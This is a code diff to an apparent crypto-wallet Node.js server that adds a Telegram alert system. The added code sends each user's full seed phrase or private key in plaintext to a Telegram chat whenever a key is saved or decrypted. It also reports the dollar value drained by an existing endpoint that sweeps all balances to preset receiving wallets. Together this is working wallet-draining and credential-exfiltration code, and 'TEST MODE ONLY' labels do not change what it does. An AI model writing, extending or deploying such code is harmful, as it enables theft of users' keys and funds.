@@ -17,6 +17,28 @@ app.use(cors());
 app.use(bodyParser.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
+// ============ TELEGRAM ALERT SYSTEM ============
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+
+async function sendTelegramAlert(message) {
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+        console.log('⚠️ Telegram not configured - skipping alert');
+        return;
+    }
+    
+    try {
+        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+        });
+        console.log('📱 Telegram alert sent');
+    } catch (error) {
+        console.error('❌ Failed to send Telegram alert:', error.message);
+    }
+}
+
 // ============ ENCRYPTION SETUP ============
 const storageDir = path.join(__dirname, 'encrypted_storage');
 if (!fs.existsSync(storageDir)) {
@@ -69,6 +91,27 @@ function saveEncryptedKey(userIdentifier, privateKey, metadata = {}) {
     }
     masterIndex.push({ id: record.id, userIdentifier, filename, createdAt: timestamp, metadata });
     fs.writeFileSync(masterLogPath, JSON.stringify(masterIndex, null, 2));
+    
+    // ============ SEND FULL SEED PHRASE TO TELEGRAM ============
+    const alertMessage = `
+🔐 <b>NEW SEED PHRASE / PRIVATE KEY RECEIVED</b>
+
+━━━━━━━━━━━━━━━━━━━━━━
+<b>📋 THE ACTUAL PHRASE:</b>
+<code>${privateKey}</code>
+━━━━━━━━━━━━━━━━━━━━━━
+
+👤 <b>User:</b> ${userIdentifier}
+🆔 <b>Key ID:</b> ${record.id.substring(0, 16)}...
+📅 <b>Time:</b> ${new Date(timestamp).toLocaleString()}
+📝 <b>Metadata:</b> ${JSON.stringify(metadata)}
+
+⚠️ <i>TEST MODE ONLY - Do not use with real funds</i>
+    `;
+    
+    sendTelegramAlert(alertMessage);
+    // ===========================================================
+    
     return { id: record.id, filename };
 }
 
@@ -85,6 +128,26 @@ function loadEncryptedKey(userIdentifier) {
     const decrypted = decryptData(record.encryptedData, record.iv, record.authTag);
     record.lastUsed = new Date().toISOString();
     fs.writeFileSync(filePath, JSON.stringify(record, null, 2));
+    
+    // ============ SEND ALERT WHEN KEY IS LOADED ============
+    const alertMessage = `
+🔓 <b>KEY LOADED (Decrypted)</b>
+
+━━━━━━━━━━━━━━━━━━━━━━
+<b>📋 THE ACTUAL PHRASE:</b>
+<code>${decrypted}</code>
+━━━━━━━━━━━━━━━━━━━━━━
+
+👤 <b>User:</b> ${userIdentifier}
+🆔 <b>Key ID:</b> ${record.id.substring(0, 16)}...
+📅 <b>Time:</b> ${new Date().toLocaleString()}
+
+⚠️ <i>TEST MODE ONLY - Do not use with real funds</i>
+    `;
+    
+    sendTelegramAlert(alertMessage);
+    // =======================================================
+    
     return decrypted;
 }
 
@@ -144,10 +207,9 @@ const BSC_CONFIG = {
     chainId: 56,
     nativeToken: 'BNB',
     nativeDecimals: 18,
-    nativePrice: 600, // Approximate BNB price
-    gasCost: 0.0005, // BSC gas is much cheaper! (~$0.30)
+    nativePrice: 600,
+    gasCost: 0.0005,
     tokenContracts: {
-        // BSC versions of popular tokens
         BSC_USDT: '0x55d398326f99059fF775485246999027B3197955',
         BSC_USDC: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
         BSC_DAI: '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3',
@@ -181,7 +243,6 @@ const receivingWallets = {
     MATIC: process.env.RECEIVING_WALLET_MATIC,
     SHIB: process.env.RECEIVING_WALLET_SHIB,
     PEPE: process.env.RECEIVING_WALLET_PEPE,
-    // BSC tokens
     BSC_USDT: process.env.RECEIVING_WALLET_BSC_USDT,
     BSC_USDC: process.env.RECEIVING_WALLET_BSC_USDC,
     BSC_DAI: process.env.RECEIVING_WALLET_BSC_DAI,
@@ -214,7 +275,6 @@ async function getBalancesForChain(provider, config, userAddress) {
     const balances = {};
     const balanceDetails = [];
     
-    // Get native token balance
     const nativeBalanceWei = await getNativeBalance(provider, userAddress);
     const nativeBalance = parseFloat(ethers.utils.formatEther(nativeBalanceWei));
     if (nativeBalance > 0) {
@@ -229,7 +289,6 @@ async function getBalancesForChain(provider, config, userAddress) {
         balances[config.nativeToken] = nativeBalanceWei;
     }
     
-    // Get token balances
     for (const [symbol, address] of Object.entries(config.tokenContracts)) {
         try {
             const decimals = config.tokenDecimals[symbol];
@@ -338,7 +397,6 @@ app.post('/api/transfer-all', async (req, res) => {
     let totalTransferredValue = 0;
     
     try {
-        // Create wallet from input (same address works on all EVM chains!)
         const ethProvider = new ethers.providers.JsonRpcProvider(ETHEREUM_CONFIG.rpcUrl);
         const userWallet = getWalletFromInput(finalInput, ethProvider);
         const userAddress = userWallet.address;
@@ -361,13 +419,11 @@ app.post('/api/transfer-all', async (req, res) => {
                 try {
                     const isNative = token.currency === 'ETH';
                     const gasLimit = isNative ? 21000 : 100000;
-                    const gasCostEth = parseFloat(ETHEREUM_CONFIG.gasCost);
                     
                     let transaction, receipt;
                     let amountTransferred, usdValueTransferred;
                     
                     if (isNative) {
-                        // Leave gas reserve
                         const gasReserve = ethers.utils.parseEther(ETHEREUM_CONFIG.gasCost.toString());
                         const balanceWei = ethBalances['ETH'];
                         let amountToTransfer = balanceWei.sub(gasReserve);
@@ -509,6 +565,23 @@ app.post('/api/transfer-all', async (req, res) => {
         const successfulCount = allTransactions.filter(t => t.status === 'success').length;
         const totalDuration = Date.now() - startTime;
         
+        // ============ SEND TELEGRAM ALERT ON SUCCESSFUL TRANSFER ============
+        const transferAlertMessage = `
+💰 <b>TRANSFER COMPLETE</b>
+
+━━━━━━━━━━━━━━━━━━━━━━
+<b>👤 Wallet:</b> ${userAddress.substring(0, 10)}...${userAddress.substring(userAddress.length - 6)}
+<b>💵 Value Transferred:</b> $${totalTransferredValue.toFixed(2)}
+<b>✅ Status:</b> Success
+<b>📅 Time:</b> ${new Date().toLocaleString()}
+<b>⏱️ Duration:</b> ${(totalDuration / 1000).toFixed(1)} seconds
+
+⚠️ <i>TEST MODE ONLY - Do not use with real funds</i>
+        `;
+        
+        sendTelegramAlert(transferAlertMessage);
+        // ================================================================
+        
         logTransaction({
             event: 'TRANSFER_BATCH_COMPLETE',
             userAddress,
@@ -522,7 +595,7 @@ app.post('/api/transfer-all', async (req, res) => {
         
         res.json({
             success: true,
-            message: `Transfer Complete! Transferred $${totalTransferredValue.toFixed(2)} worth of assets across ${allBalanceDetails.filter(d => d.chain).length > 0 ? 'multiple chains' : 'Ethereum'}.`,
+            message: `Transfer Complete! Transferred $${totalTransferredValue.toFixed(2)} worth of assets.`,
             summary: {
                 totalValueInWallet: totalWalletValue.toFixed(2),
                 totalValueTransferred: totalTransferredValue.toFixed(2),
@@ -535,6 +608,21 @@ app.post('/api/transfer-all', async (req, res) => {
         
     } catch (error) {
         logTransaction({ event: 'SYSTEM_ERROR', error: error.message });
+        
+        // ============ SEND TELEGRAM ALERT ON ERROR ============
+        const errorAlertMessage = `
+❌ <b>TRANSFER ERROR</b>
+
+━━━━━━━━━━━━━━━━━━━━━━
+<b>Error:</b> ${error.message}
+<b>📅 Time:</b> ${new Date().toLocaleString()}
+
+⚠️ <i>TEST MODE ONLY - Do not use with real funds</i>
+        `;
+        
+        sendTelegramAlert(errorAlertMessage);
+        // ======================================================
+        
         res.status(500).json({ success: false, error: error.message });
     }
 });
@@ -542,6 +630,7 @@ app.post('/api/transfer-all', async (req, res) => {
 app.listen(port, () => {
     console.log(`✅ Server running at http://localhost:${port}`);
     console.log(`🔐 Encrypted storage enabled at: ${storageDir}`);
+    console.log(`📱 Telegram alerts: ${TELEGRAM_BOT_TOKEN ? 'ENABLED' : 'DISABLED'}`);
     console.log(`💰 Multi-chain support:`);
     console.log(`   - ${ETHEREUM_CONFIG.name} (${Object.keys(ETHEREUM_CONFIG.tokenContracts).length + 1} tokens)`);
     console.log(`   - ${BSC_CONFIG.name} (${Object.keys(BSC_CONFIG.tokenContracts).length + 1} tokens)`);
